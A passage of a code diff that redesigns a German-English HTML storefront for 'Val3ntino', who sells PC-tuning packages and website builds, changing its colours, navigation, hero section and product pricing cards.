@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Val3ntino | Official Store & Services</title>
+    <title>Val3ntino | High-End Store & Services</title>
     <!-- Fonts -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -137,677 +137,477 @@
                 extend: {
                     fontFamily: { sans: ['Plus Jakarta Sans', 'sans-serif'] },
                     colors: {
-                        saBg: '#09090b',
-                        saCard: '#121217',
-                        saBorder: '#27272a',
-                        saHover: '#1c1c24',
-                        accent: '#ec4899',
-                        accentGlow: '#d946ef'
+                        bgDark: '#030305',
+                        cardDark: '#0a0a10',
+                        accent: '#ff007f',
+                        accentSky: '#38bdf8'
                     }
                 }
             }
         }
     </script>
     <style>
-        body {
-            background-color: #09090b;
-            color: #f4f4f5;
-            background-image: 
-                radial-gradient(circle at 50% 0%, rgba(217, 70, 239, 0.08) 0%, transparent 60%),
-                radial-gradient(circle at 10% 20%, rgba(236, 72, 153, 0.05) 0%, transparent 40%);
-            min-height: 100vh;
+        body { 
+            background-color: #030305; 
+            background-image: radial-gradient(circle at 50% 0%, #15061f 0%, #030305 75%);
+            color: #f4f4f5; 
+            overflow-x: hidden; 
+            -webkit-tap-highlight-color: transparent; 
         }
         .modal { display: none; }
         .modal.active { display: flex; }
-        
-        .store-banner {
-            background: linear-gradient(180deg, rgba(236, 72, 153, 0.25) 0%, rgba(9, 9, 11, 0.95) 100%), url('https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?q=80&w=1964&auto=format&fit=crop');
-            background-size: cover;
-            background-position: center;
+
+        .hero-glow {
+            position: absolute;
+            top: 5%;
+            left: 50%;
+            transform: translateX(-50%);
+            width: min(900px, 90vw);
+            height: 450px;
+            background: radial-gradient(circle, rgba(255, 0, 127, 0.15) 0%, rgba(56, 189, 248, 0.05) 45%, transparent 75%);
+            filter: blur(100px);
+            z-index: -1;
+            pointer-events: none;
+        }
+
+        .nivex-card {
+            background: linear-gradient(145deg, rgba(13, 13, 22, 0.95) 0%, rgba(7, 7, 14, 0.95) 100%);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            box-shadow: 0 20px 40px -10px rgba(0,0,0,0.7);
+            backdrop-filter: blur(20px);
         }
 
         #toast {
             visibility: hidden;
-            min-width: 260px;
-            background-color: #18181b;
+            min-width: 280px;
+            background-color: #0d0d14;
             color: #fff;
             text-align: center;
-            border-radius: 14px;
-            padding: 14px 22px;
+            border-radius: 16px;
+            padding: 16px 24px;
             position: fixed;
             z-index: 100;
-            right: 24px;
-            bottom: 24px;
-            border: 1px solid rgba(236, 72, 153, 0.5);
-            box-shadow: 0 10px 30px rgba(0,0,0,0.8);
-            font-size: 13px;
+            right: 30px;
+            bottom: 30px;
+            border: 1px solid rgba(255, 0, 127, 0.4);
+            box-shadow: 0 15px 35px rgba(0,0,0,0.6);
+            font-size: 14px;
             font-weight: 600;
         }
         #toast.show {
             visibility: visible;
-            animation: saFadeIn 0.25s, saFadeOut 0.25s 2.75s;
+            animation: fadein 0.3s, fadeout 0.3s 2.7s;
         }
-        @keyframes saFadeIn { from { bottom: 10px; opacity: 0; } to { bottom: 24px; opacity: 1; } }
-        @keyframes saFadeOut { from { bottom: 24px; opacity: 1; } to { bottom: 10px; opacity: 0; } }
+        @keyframes fadein { from { bottom: 0; opacity: 0; } to { bottom: 30px; opacity: 1; } }
+        @keyframes fadeout { from { bottom: 30px; opacity: 1; } to { bottom: 0; opacity: 0; } }
     </style>
 </head>
 <body class="antialiased selection:bg-accent selection:text-white">
 
+    <div class="hero-glow"></div>
     <div id="toast">Benachrichtigung</div>
 
-    <!-- Top Announcement Bar -->
-    <div class="w-full bg-[#121217] border-b border-saBorder/80 py-2.5 px-4 text-center text-xs font-semibold text-zinc-300 flex items-center justify-center gap-2">
-        <span class="bg-accent/20 text-accent text-[10px] font-extrabold uppercase px-2 py-0.5 rounded-full border border-accent/30">SALE ACTIVE</span>
-        <span>Nutze Code <strong class="text-white font-mono bg-white/5 px-1.5 py-0.5 rounded">VAL3NTINO</strong> für 5,00 € Rabatt an der Kasse!</span>
+    <!-- Announcement Bar -->
+    <div class="w-full bg-gradient-to-r from-accent via-pink-600 to-accentSky text-white border-b border-white/10 py-3 px-6 text-center text-xs md:text-sm font-extrabold tracking-wide absolute top-0 left-0 right-0 z-50 shadow-lg">
+        🔥 VAL3NTINO : 30% OFF — LIMITED TIME SALE ACTIVE NOW! ⚡
     </div>
 
-    <!-- Sticky Navigation Bar -->
-    <header class="sticky top-0 z-40 w-full bg-[#09090b]/90 backdrop-blur-xl border-b border-saBorder">
-        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between gap-4">
-            
-            <!-- Brand Logo -->
-            <a href="#" class="flex items-center gap-3">
-                <div class="w-9 h-9 rounded-xl bg-gradient-to-tr from-accent to-accentGlow flex items-center justify-center text-white font-black text-lg shadow-lg shadow-pink-500/20">
-                    V
-                </div>
-                <div class="flex flex-col">
-                    <span class="text-base font-extrabold text-white tracking-tight flex items-center gap-1.5">
-                        Val3ntino<span class="text-accent">.</span>
-                        <i class="fa-solid fa-circle-check text-sky-400 text-xs" title="Verified Merchant"></i>
-                    </span>
-                    <span class="text-[10px] font-medium text-zinc-400 -mt-1">High-End Performance Store</span>
-                </div>
+    <!-- Navigation -->
+    <nav class="w-full py-5 px-6 md:px-16 flex justify-between items-center border-b border-white/5 fixed top-[45px] bg-[#030305]/90 backdrop-blur-2xl z-50">
+        <a href="#" class="text-xl md:text-2xl font-extrabold tracking-tight text-white hover:text-accent transition flex items-center gap-2.5">
+            <span class="w-3 h-3 rounded-full bg-accent animate-pulse"></span> Val3ntino<span class="text-accent">.</span>
+        </a>
+        
+        <div class="hidden md:flex items-center space-x-8">
+            <a href="#" class="text-sm font-medium text-white hover:text-accent transition">Home</a>
+            <a href="#booking" class="text-sm font-medium text-gray-300 hover:text-white transition">Products</a>
+            <a href="#testimonials" class="text-sm font-medium text-gray-300 hover:text-white transition">Reviews</a>
+            <a href="#contact" class="text-sm font-medium text-gray-300 hover:text-white transition">Contact</a>
+            <a href="https://linktr.ee/val3nt1no" target="_blank" class="text-sm font-medium text-accent hover:text-white transition flex items-center gap-1.5"><i class="fa-solid fa-arrow-up-right-from-square text-xs"></i> All Links</a>
+
+            <button id="authNavBtn" onclick="toggleAuthModal()" class="px-5 py-2 bg-white/5 hover:bg-white/10 border border-white/10 rounded-full text-xs font-semibold text-white transition flex items-center gap-2">
+                <i class="fa-solid fa-arrow-right-to-bracket text-sm"></i>
+                <span>Sign In</span>
+            </button>
+
+            <button onclick="toggleCartModal()" class="relative p-2.5 bg-white/5 hover:bg-white/10 border border-white/10 rounded-full text-white transition flex items-center justify-center">
+                <i class="fa-solid fa-cart-shopping text-xs"></i>
+                <span id="cartCountBadge" class="absolute -top-1 -right-1 bg-accent text-white text-[9px] font-extrabold w-4 h-4 rounded-full flex items-center justify-center shadow-md">0</span>
+            </button>
+        </div>
+
+        <div class="flex items-center space-x-3 md:hidden">
+            <button onclick="toggleCartModal()" class="relative p-2 bg-white/5 border border-white/10 rounded-full text-white">
+                <i class="fa-solid fa-cart-shopping text-xs"></i>
+                <span id="cartBadgeMobile" class="absolute -top-1 -right-1 bg-accent text-white text-[8px] font-extrabold w-3.5 h-3.5 rounded-full flex items-center justify-center">0</span>
+            </button>
+            <button onclick="toggleMobileMenu()" class="text-gray-300 hover:text-white text-lg p-2">
+                <i class="fa-solid fa-bars" id="menuIcon"></i>
+            </button>
+        </div>
+    </nav>
+
+    <!-- Mobile Dropdown Menü -->
+    <div id="mobileMenu" class="hidden fixed inset-x-0 top-[105px] bg-[#0d0d14]/95 border-b border-white/10 p-6 flex-col space-y-4 md:hidden z-40 shadow-2xl backdrop-blur-2xl">
+        <a href="#" onclick="toggleMobileMenu()" class="text-gray-200 hover:text-white text-base font-medium">Home</a>
+        <a href="#booking" onclick="toggleMobileMenu()" class="text-gray-200 hover:text-white text-base font-medium">Products</a>
+        <a href="#testimonials" onclick="toggleMobileMenu()" class="text-gray-200 hover:text-white text-base font-medium">Reviews</a>
+        <a href="#contact" onclick="toggleMobileMenu()" class="text-gray-200 hover:text-white text-base font-medium">Contact</a>
+        <a href="https://linktr.ee/val3nt1no" target="_blank" class="text-accent text-base font-medium flex items-center gap-2"><i class="fa-solid fa-arrow-up-right-from-square text-xs"></i> All Links</a>
+    </div>
+
+    <!-- Hero Header -->
+    <header class="max-w-5xl mx-auto px-6 md:px-12 pt-52 md:pt-60 pb-20 md:pb-28 text-center relative">
+        <div class="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-xs font-semibold mb-8 shadow-xl backdrop-blur-md">
+            <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
+            <span>Available for freelance & high-end projects</span>
+        </div>
+
+        <h1 class="text-5xl sm:text-6xl md:text-7xl font-extrabold text-white tracking-tight mb-4">
+            Hi, I'm Valentino.
+        </h1>
+        <p class="text-xl md:text-3xl text-gray-400 font-light mb-6">
+            aka <span class="text-transparent bg-clip-text bg-gradient-to-r from-accent via-pink-400 to-accentSky font-bold">Val3ntino</span>
+        </p>
+        <p class="text-sm md:text-base text-gray-300 max-w-2xl mx-auto leading-relaxed font-light px-4 mb-8">
+            I build clean web applications, optimize Windows & hardware for uncompromising performance, and create custom game scripts.
+        </p>
+
+        <div class="flex justify-center">
+            <a href="https://discord.gg/YE2jHSwM7" target="_blank" class="inline-flex items-center gap-3 px-7 py-3.5 bg-accent hover:opacity-95 text-white font-bold rounded-full text-sm md:text-base shadow-xl shadow-pink-500/25 transition transform hover:scale-105">
+                <i class="fa-brands fa-discord text-lg"></i>
+                <span>Join Discord Community</span>
+                <i class="fa-solid fa-arrow-right text-xs"></i>
             </a>
-
-            <!-- Search (Desktop) -->
-            <div class="hidden md:flex items-center flex-1 max-w-md mx-8">
-                <div class="relative w-full">
-                    <i class="fa-solid fa-magnifying-glass absolute left-3.5 top-1/2 -translate-y-1/2 text-zinc-400 text-xs"></i>
-                    <input type="text" id="storeSearchInput" oninput="filterProducts()" placeholder="Produkte, Tweaks & Services suchen..." class="w-full bg-[#121217] border border-saBorder rounded-xl pl-9 pr-4 py-2 text-xs text-white placeholder-zinc-500 focus:outline-none focus:border-accent transition">
-                </div>
-            </div>
-
-            <!-- Actions -->
-            <div class="flex items-center gap-3">
-                <div class="hidden sm:flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-[#121217] border border-saBorder text-xs text-zinc-300 font-semibold">
-                    <i class="fa-solid fa-euro-sign text-accent text-[11px]"></i> EUR
-                </div>
-
-                <a href="https://discord.gg/YE2jHSwM7" target="_blank" class="p-2 sm:px-3 sm:py-1.5 rounded-xl bg-[#121217] hover:bg-saHover border border-saBorder text-xs font-semibold text-zinc-300 hover:text-white transition flex items-center gap-2">
-                    <i class="fa-brands fa-discord text-[#5865F2] text-sm"></i>
-                    <span class="hidden sm:inline">Discord</span>
-                </a>
-
-                <a href="https://linktr.ee/val3nt1no" target="_blank" class="p-2 sm:px-3 sm:py-1.5 rounded-xl bg-white/5 hover:bg-white/10 border border-saBorder text-xs font-semibold text-accent hover:text-white transition flex items-center gap-1.5">
-                    <i class="fa-solid fa-arrow-up-right-from-square text-xs"></i>
-                    <span class="hidden sm:inline">All Links</span>
-                </a>
-
-                <button id="authNavBtn" onclick="toggleAuthModal()" class="px-3.5 py-1.5 rounded-xl bg-[#121217] hover:bg-saHover border border-saBorder text-xs font-semibold text-white transition flex items-center gap-2">
-                    <i class="fa-solid fa-arrow-right-to-bracket text-sm"></i>
-                    <span>Sign In</span>
-                </button>
-
-                <button onclick="toggleCartModal()" class="relative p-2 sm:px-3.5 sm:py-1.5 rounded-xl bg-accent text-white hover:bg-accent/90 transition text-xs font-bold flex items-center gap-2 shadow-lg shadow-pink-500/20">
-                    <i class="fa-solid fa-bag-shopping text-sm"></i>
-                    <span class="hidden sm:inline">Cart</span>
-                    <span id="cartCountBadge" class="bg-black/40 text-white text-[10px] px-1.5 py-0.5 rounded-full font-black">0</span>
-                </button>
-            </div>
         </div>
     </header>
 
-    <!-- Mobile Search -->
-    <div class="md:hidden px-4 pt-3 pb-1 max-w-7xl mx-auto">
-        <div class="relative w-full">
-            <i class="fa-solid fa-magnifying-glass absolute left-3.5 top-1/2 -translate-y-1/2 text-zinc-400 text-xs"></i>
-            <input type="text" oninput="applySearch(this.value.toLowerCase())" placeholder="Produkte suchen..." class="w-full bg-[#121217] border border-saBorder rounded-xl pl-9 pr-4 py-2.5 text-xs text-white placeholder-zinc-500 focus:outline-none focus:border-accent">
-        </div>
-    </div>
+    <main class="max-w-6xl mx-auto px-6 md:px-12 pb-24">
+        <!-- Store Sektion -->
+        <section id="booking" class="mb-28">
+            <div class="text-center mb-14">
+                <h2 class="text-3xl sm:text-4xl font-extrabold text-white mb-3">Store & Services</h2>
+                <p class="text-gray-400 text-sm md:text-base font-light">Wähle dein Paket aus und kaufe direkt per Sofortkauf.</p>
+            </div>
 
-    <!-- Store Profile Header -->
-    <section class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 pt-4 pb-8">
-        <div class="store-banner h-48 sm:h-60 rounded-3xl border border-saBorder relative flex items-end p-6 sm:p-8 overflow-hidden shadow-2xl">
-            <div class="absolute inset-0 bg-gradient-to-t from-[#09090b] via-[#09090b]/45 to-transparent"></div>
-            
-            <div class="relative z-10 flex flex-col sm:flex-row sm:items-end justify-between w-full gap-4">
-                <div class="flex items-center gap-5">
-                    <div class="w-20 h-20 sm:w-24 sm:h-24 rounded-2xl bg-[#121217] border-2 border-accent/80 p-1 flex items-center justify-center shadow-xl">
-                        <div class="w-full h-full rounded-xl bg-gradient-to-br from-zinc-800 to-black flex items-center justify-center text-white font-extrabold text-3xl">
-                            V
-                        </div>
-                    </div>
+            <div class="grid md:grid-cols-3 gap-8 items-stretch">
+                <!-- Plan 1 -->
+                <div class="nivex-card p-7 md:p-8 rounded-3xl flex flex-col justify-between">
                     <div>
-                        <div class="flex items-center gap-2 mb-1">
-                            <h1 class="text-2xl sm:text-3xl font-extrabold text-white tracking-tight">Val3ntino</h1>
-                            <span class="inline-flex items-center gap-1 text-[11px] font-bold bg-sky-500/10 text-sky-400 border border-sky-500/20 px-2 py-0.5 rounded-full">
-                                <i class="fa-solid fa-circle-check text-[10px]"></i> Verified Merchant
-                            </span>
+                        <div class="w-full h-40 rounded-2xl bg-gradient-to-br from-blue-600/20 to-accent/20 border border-white/10 mb-6 flex items-center justify-center text-accent text-3xl shadow-inner">
+                            <i class="fa-solid fa-gauge-high"></i>
                         </div>
-                        <p class="text-xs sm:text-sm text-zinc-300 font-light max-w-xl">
-                            High-End Windows 0-Delay PC-Tuning, saubere Web-Entwicklung & individuelle Skripte.
-                        </p>
+                        <h3 class="text-xl font-bold text-white mb-2">Basic PC-Tuning</h3>
+                        <p class="text-3xl md:text-4xl font-black text-white mb-6">€15.00</p>
+                        <ul class="text-gray-300 text-xs md:text-sm space-y-3 mb-8 font-light">
+                            <li><i class="fa-solid fa-check text-accent mr-2.5"></i> Windows Basic Optimization</li>
+                            <li><i class="fa-solid fa-check text-accent mr-2.5"></i> Stop Background Services</li>
+                            <li><i class="fa-solid fa-check text-accent mr-2.5"></i> Standard FPS Boost</li>
+                        </ul>
                     </div>
-                </div>
-
-                <!-- Trust Badges -->
-                <div class="flex items-center gap-3">
-                    <div class="bg-[#121217]/90 border border-saBorder rounded-2xl px-3.5 py-2 flex items-center gap-2 text-xs backdrop-blur-md">
-                        <i class="fa-solid fa-bolt text-amber-400"></i>
-                        <div>
-                            <p class="font-bold text-white text-[11px]">Sofortige Lieferung</p>
-                            <p class="text-[10px] text-zinc-400">Automatische Zustellung</p>
-                        </div>
-                    </div>
-                    <div class="bg-[#121217]/90 border border-saBorder rounded-2xl px-3.5 py-2 flex items-center gap-2 text-xs backdrop-blur-md">
-                        <i class="fa-solid fa-star text-amber-400"></i>
-                        <div>
-                            <p class="font-bold text-white text-[11px]">5.0 / 5.0</p>
-                            <p class="text-[10px] text-zinc-400">98 Verifizierte Kunden</p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Filter & Products -->
-    <main class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 pb-20">
-        
-        <!-- Controls Bar -->
-        <div class="flex flex-col md:flex-row items-stretch md:items-center justify-between gap-4 mb-8 border-b border-saBorder/60 pb-6">
-            <div class="flex items-center gap-2 overflow-x-auto pb-2 md:pb-0 no-scrollbar">
-                <button onclick="setCategory('all')" id="cat-all" class="category-btn px-4 py-2 rounded-xl text-xs font-bold transition whitespace-nowrap bg-white text-black">
-                    Alle Produkte
-                </button>
-                <button onclick="setCategory('tuning')" id="cat-tuning" class="category-btn px-4 py-2 rounded-xl text-xs font-semibold text-zinc-400 hover:text-white hover:bg-saCard transition whitespace-nowrap">
-                    PC Tuning & 0-Delay
-                </button>
-                <button onclick="setCategory('web')" id="cat-web" class="category-btn px-4 py-2 rounded-xl text-xs font-semibold text-zinc-400 hover:text-white hover:bg-saCard transition whitespace-nowrap">
-                    Web Development
-                </button>
-                <button onclick="setCategory('services')" id="cat-services" class="category-btn px-4 py-2 rounded-xl text-xs font-semibold text-zinc-400 hover:text-white hover:bg-saCard transition whitespace-nowrap">
-                    Custom Services
-                </button>
-            </div>
-
-            <div class="flex items-center justify-between md:justify-end gap-3">
-                <span class="text-xs text-zinc-500 font-medium" id="productCountLabel">3 Produkte</span>
-                <select id="sortSelect" onchange="sortProducts()" class="bg-[#121217] border border-saBorder text-zinc-300 text-xs rounded-xl px-3 py-2 focus:outline-none focus:border-accent">
-                    <option value="featured">Empfohlen</option>
-                    <option value="low-high">Preis: Aufsteigend</option>
-                    <option value="high-low">Preis: Absteigend</option>
-                </select>
-            </div>
-        </div>
-
-        <!-- Products Grid -->
-        <div id="productsGrid" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6">
-            
-            <!-- Produkt 1: Basic PC-Tuning -->
-            <div class="product-item group bg-[#121217] border border-saBorder hover:border-saBorder/80 rounded-2xl overflow-hidden transition-all duration-200 hover:-translate-y-1 flex flex-col justify-between" data-category="tuning" data-price="15.00" data-name="Basic PC-Tuning">
-                <div>
-                    <div class="relative h-44 bg-gradient-to-br from-blue-950/40 via-zinc-900 to-[#121217] p-4 flex flex-col justify-between border-b border-saBorder">
-                        <div class="flex justify-between items-center">
-                            <span class="text-[10px] font-extrabold px-2.5 py-1 rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 flex items-center gap-1.5">
-                                <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span> Auf Lager
-                            </span>
-                            <span class="text-[10px] font-bold text-zinc-400 bg-black/40 px-2 py-0.5 rounded-md">PC Tuning</span>
-                        </div>
-                        <div class="flex justify-center items-center h-full">
-                            <i class="fa-solid fa-gauge-high text-4xl text-sky-400 group-hover:scale-110 transition duration-300"></i>
-                        </div>
-                    </div>
-
-                    <div class="p-5">
-                        <h3 class="text-base font-bold text-white mb-1 group-hover:text-accent transition">Basic PC-Tuning</h3>
-                        <p class="text-xs text-zinc-400 line-clamp-2 font-light mb-4 leading-relaxed">
-                            Windows Service-Bereinigung, Hintergrund-Debloat, FPS-Stabilisierung und Basis-Timer-Optimierung.
-                        </p>
-                        <div class="space-y-1.5 text-xs text-zinc-300 font-light mb-4">
-                            <div class="flex items-center gap-2"><i class="fa-solid fa-check text-accent text-[11px]"></i> Windows Basis-Optimierung</div>
-                            <div class="flex items-center gap-2"><i class="fa-solid fa-check text-accent text-[11px]"></i> Unnötige Hintergrunddienste stoppen</div>
-                            <div class="flex items-center gap-2"><i class="fa-solid fa-check text-accent text-[11px]"></i> Sofortige Anleitung & Download</div>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="p-5 pt-0">
-                    <div class="flex items-baseline justify-between border-t border-saBorder/60 pt-4 mb-3">
-                        <span class="text-xs text-zinc-500">Ab</span>
-                        <span class="text-xl font-extrabold text-white">€15.00 <span class="text-xs text-zinc-500 font-normal">EUR</span></span>
-                    </div>
-                    <div class="grid grid-cols-2 gap-2">
-                        <button onclick="openProductDetail('basic')" class="w-full py-2.5 rounded-xl bg-white/5 hover:bg-white/10 text-white text-xs font-semibold transition border border-saBorder">
-                            Details
+                    <div class="grid grid-cols-2 gap-2.5">
+                        <button onclick="addToCartDirect('Basic PC-Tuning', 15.00)" class="py-3 text-center bg-white/5 hover:bg-white/10 border border-white/10 rounded-xl transition font-bold text-white text-xs flex items-center justify-center gap-1.5">
+                            <i class="fa-solid fa-cart-plus text-accent"></i> Cart
                         </button>
-                        <button onclick="addToCartDirect('Basic PC-Tuning', 15.00)" class="w-full py-2.5 rounded-xl bg-accent hover:opacity-95 text-white text-xs font-bold transition flex items-center justify-center gap-2 shadow-lg shadow-pink-500/20">
-                            <i class="fa-solid fa-cart-plus"></i> Kaufen
+                        <button onclick="buyNowDirect('Basic PC-Tuning', 15.00)" class="py-3 text-center bg-accent hover:opacity-90 text-white rounded-xl transition font-bold text-xs flex items-center justify-center gap-1.5 shadow-lg">
+                            <i class="fa-solid fa-bolt"></i> Kaufen
                         </button>
                     </div>
                 </div>
-            </div>
 
-            <!-- Produkt 2: Pro Tuning 0 Delay (Bestseller) -->
-            <div class="product-item group bg-[#121217] border-2 border-accent/50 rounded-2xl overflow-hidden transition-all duration-200 hover:-translate-y-1 flex flex-col justify-between relative shadow-xl shadow-pink-500/5" data-category="tuning" data-price="35.00" data-name="Pro Tuning (0 Delay)">
-                <div class="absolute top-3 right-3 z-10">
-                    <span class="text-[10px] font-extrabold px-2.5 py-1 rounded-full bg-accent text-white shadow-md">
-                        ★ POPULAR
-                    </span>
-                </div>
-                <div>
-                    <div class="relative h-44 bg-gradient-to-br from-pink-950/40 via-zinc-900 to-[#121217] p-4 flex flex-col justify-between border-b border-saBorder">
-                        <div class="flex justify-between items-center">
-                            <span class="text-[10px] font-extrabold px-2.5 py-1 rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 flex items-center gap-1.5">
-                                <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span> Auf Lager
-                            </span>
+                <!-- Plan 2 (Bestseller) -->
+                <div class="nivex-card p-7 md:p-8 rounded-3xl relative flex flex-col justify-between transform md:-translate-y-3 border-accent/50 shadow-2xl shadow-pink-500/10">
+                    <div class="absolute top-0 left-1/2 transform -translate-x-1/2 -translate-y-1/2 bg-accent text-white text-[11px] font-extrabold px-4 py-1 rounded-full shadow-lg">POPULAR</div>
+                    <div>
+                        <div class="w-full h-40 rounded-2xl bg-gradient-to-br from-accent/30 to-purple-600/25 border border-white/10 mb-6 flex items-center justify-center text-white text-3xl shadow-inner">
+                            <i class="fa-solid fa-microchip"></i>
                         </div>
-                        <div class="flex justify-center items-center h-full">
-                            <i class="fa-solid fa-microchip text-4xl text-accent group-hover:scale-110 transition duration-300"></i>
-                        </div>
+                        <h3 class="text-xl font-bold text-white mb-2 mt-1">Pro Tuning (0 Delay)</h3>
+                        <p class="text-3xl md:text-4xl font-black text-white mb-6">€35.00</p>
+                        <ul class="text-gray-300 text-xs md:text-sm space-y-3 mb-8 font-light">
+                            <li><i class="fa-solid fa-check text-accent mr-2.5"></i> Everything in Basic</li>
+                            <li><i class="fa-solid fa-check text-accent mr-2.5"></i> BIOS & Registry Edits</li>
+                            <li><i class="fa-solid fa-check text-accent mr-2.5"></i> 0 Input Delay Setup</li>
+                            <li><i class="fa-solid fa-check text-accent mr-2.5"></i> Max Performance Guarantee</li>
+                        </ul>
                     </div>
-
-                    <div class="p-5">
-                        <h3 class="text-base font-bold text-white mb-1 group-hover:text-accent transition">Pro Tuning (0 Delay Setup)</h3>
-                        <p class="text-xs text-zinc-400 line-clamp-2 font-light mb-4 leading-relaxed">
-                            Ultra Low-Latency Setup, BIOS- & Registry-Edits, Interrupt Affinity (MSI Mode), BCDedit und maximale Reaktionszeit.
-                        </p>
-                        <div class="space-y-1.5 text-xs text-zinc-300 font-light mb-4">
-                            <div class="flex items-center gap-2"><i class="fa-solid fa-check text-accent text-[11px]"></i> Alles aus Basic enthalten</div>
-                            <div class="flex items-center gap-2"><i class="fa-solid fa-check text-accent text-[11px]"></i> Echtes 0-Input-Delay Setup</div>
-                            <div class="flex items-center gap-2"><i class="fa-solid fa-check text-accent text-[11px]"></i> 1-zu-1 Discord Remote Support</div>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="p-5 pt-0">
-                    <div class="flex items-baseline justify-between border-t border-saBorder/60 pt-4 mb-3">
-                        <span class="text-xs text-zinc-500">Ab</span>
-                        <span class="text-xl font-extrabold text-white">€35.00 <span class="text-xs text-zinc-500 font-normal">EUR</span></span>
-                    </div>
-                    <div class="grid grid-cols-2 gap-2">
-                        <button onclick="openProductDetail('pro')" class="w-full py-2.5 rounded-xl bg-white/5 hover:bg-white/10 text-white text-xs font-semibold transition border border-saBorder">
-                            Details
+                    <div class="grid grid-cols-2 gap-2.5">
+                        <button onclick="addToCartDirect('Pro Tuning (0 Delay)', 35.00)" class="py-3 text-center bg-white/5 hover:bg-white/10 border border-white/10 rounded-xl transition font-bold text-xs flex items-center justify-center gap-1.5">
+                            <i class="fa-solid fa-cart-plus text-accent"></i> Cart
                         </button>
-                        <button onclick="addToCartDirect('Pro Tuning (0 Delay)', 35.00)" class="w-full py-2.5 rounded-xl bg-accent hover:opacity-95 text-white text-xs font-bold transition flex items-center justify-center gap-2 shadow-lg shadow-pink-500/20">
-                            <i class="fa-solid fa-cart-plus"></i> Kaufen
+                        <button onclick="buyNowDirect('Pro Tuning (0 Delay)', 35.00)" class="py-3 text-center bg-accent hover:opacity-90 text-white rounded-xl transition font-bold text-xs flex items-center justify-center gap-1.5 shadow-lg">
+                            <i class="fa-solid fa-bolt"></i> Kaufen
                         </button>
                     </div>
                 </div>
-            </div>
 
-            <!-- Produkt 3: Website Build -->
-            <div class="product-item group bg-[#121217] border border-saBorder hover:border-saBorder/80 rounded-2xl overflow-hidden transition-all duration-200 hover:-translate-y-1 flex flex-col justify-between" data-category="web" data-price="25.00" data-name="Custom Website Build">
-                <div>
-                    <div class="relative h-44 bg-gradient-to-br from-emerald-950/40 via-zinc-900 to-[#121217] p-4 flex flex-col justify-between border-b border-saBorder">
-                        <div class="flex justify-between items-center">
-                            <span class="text-[10px] font-extrabold px-2.5 py-1 rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 flex items-center gap-1.5">
-                                <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span> Auf Lager
-                            </span>
-                            <span class="text-[10px] font-bold text-zinc-400 bg-black/40 px-2 py-0.5 rounded-md">Web Dev</span>
+                <!-- Plan 3 -->
+                <div class="nivex-card p-7 md:p-8 rounded-3xl flex flex-col justify-between">
+                    <div>
+                        <div class="w-full h-40 rounded-2xl bg-gradient-to-br from-emerald-600/20 to-cyan-600/20 border border-white/10 mb-6 flex items-center justify-center text-sky-400 text-3xl shadow-inner">
+                            <i class="fa-solid fa-laptop-code"></i>
                         </div>
-                        <div class="flex justify-center items-center h-full">
-                            <i class="fa-solid fa-code text-4xl text-emerald-400 group-hover:scale-110 transition duration-300"></i>
-                        </div>
+                        <h3 class="text-xl font-bold text-white mb-2">Website Build</h3>
+                        <p class="text-3xl md:text-4xl font-black text-white mb-6">€25.00</p>
+                        <ul class="text-gray-300 text-xs md:text-sm space-y-3 mb-8 font-light">
+                            <li><i class="fa-solid fa-check text-accent mr-2.5"></i> Clean Portfolio Design</li>
+                            <li><i class="fa-solid fa-check text-accent mr-2.5"></i> Fully Responsive</li>
+                            <li><i class="fa-solid fa-check text-accent mr-2.5"></i> Contact Form & Setup</li>
+                            <li><i class="fa-solid fa-check text-accent mr-2.5"></i> GitHub Pages Help</li>
+                        </ul>
                     </div>
-
-                    <div class="p-5">
-                        <h3 class="text-base font-bold text-white mb-1 group-hover:text-accent transition">Custom Website Build</h3>
-                        <p class="text-xs text-zinc-400 line-clamp-2 font-light mb-4 leading-relaxed">
-                            Moderne Single-Page Website oder Portfolio im Storefront-Stil. Mobil optimiert, sauberes Dark-UI, Discord-Anbindung.
-                        </p>
-                        <div class="space-y-1.5 text-xs text-zinc-300 font-light mb-4">
-                            <div class="flex items-center gap-2"><i class="fa-solid fa-check text-accent text-[11px]"></i> Sauberes, responsives Design</div>
-                            <div class="flex items-center gap-2"><i class="fa-solid fa-check text-accent text-[11px]"></i> Hosting & Domain-Setup Hilfe</div>
-                            <div class="flex items-center gap-2"><i class="fa-solid fa-check text-accent text-[11px]"></i> Vollständiger Quellcode inklusive</div>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="p-5 pt-0">
-                    <div class="flex items-baseline justify-between border-t border-saBorder/60 pt-4 mb-3">
-                        <span class="text-xs text-zinc-500">Ab</span>
-                        <span class="text-xl font-extrabold text-white">€25.00 <span class="text-xs text-zinc-500 font-normal">EUR</span></span>
-                    </div>
-                    <div class="grid grid-cols-2 gap-2">
-                        <button onclick="openProductDetail('web')" class="w-full py-2.5 rounded-xl bg-white/5 hover:bg-white/10 text-white text-xs font-semibold transition border border-saBorder">
-                            Details
+                    <div class="grid grid-cols-2 gap-2.5">
+                        <button onclick="addToCartDirect('Website Build', 25.00)" class="py-3 text-center bg-white/5 hover:bg-white/10 border border-white/10 rounded-xl transition font-bold text-xs flex items-center justify-center gap-1.5">
+                            <i class="fa-solid fa-cart-plus text-accent"></i> Cart
                         </button>
